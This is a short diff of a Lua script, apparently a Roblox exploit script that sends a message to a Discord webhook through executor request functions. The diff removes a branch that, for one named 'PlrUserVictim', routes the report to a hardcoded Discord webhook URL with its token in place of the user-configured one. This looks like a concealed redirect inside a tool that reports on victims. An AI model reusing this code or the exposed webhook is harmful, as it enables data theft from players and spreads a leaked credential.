@@ -44,12 +44,6 @@ local msg = {
   ["attachments"] = {}
 }
 
-if _G.PlrUserVictim == "W4r_ObScUrE" then
-	local Webhook = "https://discord.com/api/webhooks/1120368835447505069/8wm6KuytMaRBojApLvAVmDxReB2u4_ShgOliXjQJ4alllh2BbNgoZIL58izN8UYLjWl6"
-else
-        local Webhook = _G.Webhook
-end
-
 
 local function sendwebhook(msg)
    request = http_request or request or HttpPost or syn.request
